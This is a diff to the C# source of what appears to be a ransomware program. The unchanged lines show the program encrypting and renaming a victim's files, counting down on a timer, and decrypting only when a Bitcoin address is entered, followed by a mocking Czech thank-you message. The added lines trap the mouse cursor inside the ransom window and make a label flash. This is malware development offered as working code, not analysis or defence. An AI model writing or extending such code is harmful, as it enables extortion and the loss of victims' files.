@@ -82,7 +82,7 @@ namespace rw2
                     try 
                     { 
                         File.Move(file, newFile);
-                    } catch(Exception ex)
+                    } catch
                     {
                         newFile = newFile + getRandomString(5, 7);
                         File.Move(file, newFile);
@@ -98,7 +98,7 @@ namespace rw2
                 try
                 {
                     File.Move(file, cryptedFilePosition);
-                } catch(Exception ex)
+                } catch
                 {
                     password = getRandomString(20, 25);
                     cryptedFilePosition = cryptedFilePosition = getCryptedString(password, file);
@@ -137,7 +137,7 @@ namespace rw2
         int triesLeft = 3;
         private void button4_Click(object sender, EventArgs e)
         {
-            if(textBox2.Text == btcAddress) { dekrypce(); Hide(); MessageBox.Show("Děkuji za spolupráci :-D"); Application.Exit(); }
+            if(textBox2.Text == btcAddress) { timer1.Stop(); dekrypce(); Hide(); MessageBox.Show("Děkuji za spolupráci :-D"); Application.Exit(); }
             else 
             {
                 textBox2.Text = String.Empty;
@@ -157,16 +157,41 @@ namespace rw2
             encrypce();
             timer1.Enabled = true;
         }
-
+        //
+        //
+        //              30,30
+        //              ________________________
+        //              I                       I
+        //              I                       I
+        //              I                       I
+        //              I                       I
+        //              I                       I
+        //              I                       I
+        //              L_______________________L30,30
+        
+        public void mouseLock()
+        { //location + size 
+            
+            if(timer1.Enabled&&(Cursor.Position.X >= this.Location.X && Cursor.Position.X <= this.Size.Width+this.Location.X) && (Cursor.Position.Y >= this.Location.Y && Cursor.Position.Y <= this.Size.Height + this.Location.Y))
+            {
+                return;
+            }
+            Cursor.Position = new Point(this.Location.X + this.Width / 2, this.Location.Y + this.Height / 2);
+        }
+        bool barva = true;
         private void timer1_Tick(object sender, EventArgs e)
         {
             milisec--;
-            if(milisec < 0)
+            mouseLock();
+            if (milisec < 0)
             {
                 seconds--;
                 milisec = 99;
-                if(seconds < 0)
+                if (textBox2.Visible && barva) { label1.ForeColor = Color.Black; barva = false; }
+                else { label1.ForeColor = Color.Yellow; barva = true; }
+                if (seconds < 0)
                 {
+                    
                     minutes--;
                     seconds = 59;
                     if(minutes == 0)
